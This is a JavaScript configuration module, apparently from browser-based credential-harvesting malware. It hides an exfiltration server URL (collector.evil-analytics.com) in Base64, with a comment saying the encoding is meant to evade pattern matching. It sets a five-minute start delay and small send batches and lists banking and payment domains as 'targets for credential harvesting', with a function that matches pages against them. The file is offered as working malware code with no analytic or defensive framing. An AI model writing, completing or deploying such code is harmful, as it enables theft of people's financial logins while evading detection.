// config.js - Obfuscated configuration
// The server URL is Base64 encoded to evade simple pattern matching

// Encoded: "https://collector.evil-analytics.com/api/collect"
const ENCODED_SERVER = "aHR0cHM6Ly9jb2xsZWN0b3IuZXZpbC1hbmFseXRpY3MuY29tL2FwaS9jb2xsZWN0";

// Encoded: "report"
const ENCODED_ENDPOINT = "cmVwb3J0";

// Delay configuration (in milliseconds)
export const INITIAL_DELAY = 5 * 60 * 1000;  // 5 minutes
export const BATCH_DELAY = 2000;             // 2 seconds between batches
export const BATCH_SIZE = 3;                  // items per batch

// Decode server configuration
export function getServerConfig() {
  const base = atob(ENCODED_SERVER);
  const endpoint = atob(ENCODED_ENDPOINT);
  return {
    url: base,
    endpoint: endpoint
  };
}

// Target domains for credential harvesting
export const TARGET_DOMAINS = [
  "bank.example",
  "payment.example",
  "secure.example"
];

// Check if current URL matches target
export function isTargetDomain(url) {
  try {
    const hostname = new URL(url).hostname;
    return TARGET_DOMAINS.some(domain => hostname.includes(domain));
  } catch {
    return false;
  }
}
